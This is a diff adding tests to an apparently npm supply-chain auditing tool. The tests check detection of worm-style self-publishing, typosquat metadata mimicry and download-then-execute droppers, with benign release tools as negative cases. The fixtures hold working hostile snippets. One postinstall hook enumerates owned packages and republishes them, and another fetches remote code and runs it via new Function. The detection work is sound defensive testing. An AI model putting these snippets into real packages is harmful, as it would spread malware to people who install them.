@@ -831,3 +831,173 @@ test("#7d a build script (not an install hook) reading IMDS does not BLOCK", () 
   assert.equal(report.verdict, "review");
   assert.equal(findingFor(report, "cloud-metadata-access").severity, "medium");
 });
+
+// --- #8 registry self-publish (worm replication) ----------------------------
+// The publish primitive itself is ubiquitous in release tooling, so it can never
+// be the signal on its own. Only two shapes fire: publishing from install-time
+// code, and enumerating what the current credentials can reach before
+// publishing. The negatives are release tools that must stay silent.
+
+test("#8 postinstall that enumerates then publishes BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node p.js" } }),
+      "p.js":
+        'const cp=require("child_process");const owned=JSON.parse(cp.execSync("npm access list packages --json").toString());for(const n of Object.keys(owned)){cp.execSync("npm publish --access public",{cwd:"/tmp/s/"+n});}'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "registry-self-publish").severity, "high");
+});
+
+test("#8 an install hook that publishes inline in package.json BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "npm publish --access public" } })
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "registry-self-publish").severity, "high");
+});
+
+test("#8 enumerate-then-publish outside an install hook still BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ main: "index.js" }),
+      "index.js":
+        'const cp=require("child_process");const mine=cp.execSync("npm owner ls").toString();cp.execSync("npm publish --access public");module.exports=mine;'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "registry-self-publish").severity, "high");
+});
+
+test("#8 a release tool shelling out to npm publish does NOT fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ bin: { rel: "cli.js" } }),
+      "cli.js":
+        'const execa=require("execa");\nasync function publish(pkg,ctx){await execa("npm",["publish",pkg.path,"--tag",ctx.tag],{env:{NPM_TOKEN:process.env.NPM_TOKEN}});}\nmodule.exports={publish};'
+    }
+  });
+  assert.ok(!categories(report).includes("registry-self-publish"));
+  assert.equal(report.verdict, "safe");
+});
+
+test("#8 a `release` npm script that publishes does NOT fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { release: "npm publish --access public" } }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  assert.ok(!categories(report).includes("registry-self-publish"));
+});
+
+// --- #9 metadata mimicry (evidence only, never gating) ----------------------
+// Deliberately INFO-tier: a convincing typosquat is shaped exactly like a
+// legitimate variant, so this can report the discrepancy but must never decide
+// a verdict. The gate on a CONSUMER install hook is what keeps ordinary
+// monorepo naming out of the output entirely.
+
+test("#9 name disagreeing with repository + postinstall is recorded as info", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "easy-day-js",
+        version: "1.11.13",
+        repository: "https://github.com/iamkun/dayjs.git",
+        scripts: { postinstall: "node index.js" }
+      }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  const f = findingFor(report, "metadata-mimicry");
+  assert.equal(f.severity, "info");
+});
+
+test("#9 metadata-mimicry never escalates a verdict on its own", () => {
+  const withMimicry = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "easy-day-js",
+        version: "1.0.0",
+        repository: "https://github.com/iamkun/dayjs.git",
+        scripts: { postinstall: "node index.js" }
+      }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  const withoutMimicry = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "dayjs",
+        version: "1.0.0",
+        repository: "https://github.com/iamkun/dayjs.git",
+        scripts: { postinstall: "node index.js" }
+      }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  // Identical verdicts: the only difference between these two packages is the
+  // mimicry finding, and it must not move the needle.
+  assert.equal(withMimicry.verdict, withoutMimicry.verdict);
+});
+
+test("#9 a monorepo package without a consumer install hook stays quiet", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "react-dom",
+        version: "18.2.0",
+        repository: "https://github.com/facebook/react.git",
+        main: "index.js"
+      }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  assert.ok(!categories(report).includes("metadata-mimicry"));
+  assert.equal(report.verdict, "safe");
+});
+
+test("#9 a monorepo `prepare` hook does not count as a consumer hook", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "@babel/core",
+        version: "7.24.0",
+        repository: "https://github.com/babel/babel.git",
+        scripts: { prepare: "node build.js" }
+      }),
+      "index.js": "module.exports = 1;"
+    }
+  });
+  assert.ok(!categories(report).includes("metadata-mimicry"));
+});
+
+// --- #10 callback-style download-then-execute -------------------------------
+// The promise forms were covered; the older `res.on("end", …)` accumulator that
+// hands the body to new Function was not, which left the unobfuscated Mastra
+// dropper shape citing nothing but generic code-execution.
+
+test("#10 https.get accumulator feeding new Function is flagged", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node d.js" } }),
+      "d.js":
+        'const https=require("https");https.get("https://cdn.example.net/p.js",r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>new Function(d)());});'
+    }
+  });
+  assert.ok(categories(report).includes("remote-code-load"));
+});
+
+test("#10 an ordinary response accumulator that parses JSON does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ main: "index.js" }),
+      "index.js":
+        'const https=require("https");function get(u){return new Promise(res=>{https.get(u,r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>res(JSON.parse(d)));});});}module.exports=get;'
+    }
+  });
+  assert.ok(!categories(report).includes("remote-code-load"));
+});
